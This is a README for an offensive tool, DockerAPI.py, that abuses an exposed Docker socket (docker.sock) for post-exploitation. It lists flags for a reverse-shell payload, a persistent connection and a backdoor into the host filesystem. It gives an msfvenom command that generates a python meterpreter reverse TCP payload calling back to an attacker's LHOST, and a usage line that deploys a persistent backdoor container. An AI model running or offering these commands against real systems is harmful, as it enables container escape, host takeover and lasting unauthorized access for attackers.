# API Docker Attack
**Post-exploitation using exposed Docker API (docker.sock)**

![docker-api](https://user-images.githubusercontent.com/52386190/86634989-ebd16100-bfa8-11ea-9b32-d91ee243b50a.png)

Docker provides an API for interacting with the Docker daemon (called the [Docker Engine API](https://docs.docker.com/engine/api/)) located in `unix:///var/run/docker.sock`. Docker.sock is a Unix socket where the Docker daemon is listening. We can exploit this feature to call Docker API functions and inject privileged or malicious commands.

Example of configuration failure in docker environments:
```shell
docker run --interactive --tty --volume /var/run/docker.sock:/var/run/docker.sock <image>
```
- **Dependencies:**

```shell
pip3 install docker
apt/dnf -y install netcat
```

- **Help**

| Command | Description | 
|---|---|
| --list-containers | List all containers |
| --into | Connecting container |
| --remove | Remove container |
| --payload | Payload of reverse shell |
| --persistent | Maintain persistent connection |
| --backdoor | Backdoor for accessing the host filesystem |

- **Usage:**

> Create backdoor container as persistent reverse connection to access host filesystem

Create payload of reverse shell with [msfvenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/):
```shell
msfvenom -p python/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw -o payload.py
```
Run:
```shell
DockerAPI.py --backdoor --payload payload.py --persistent
```
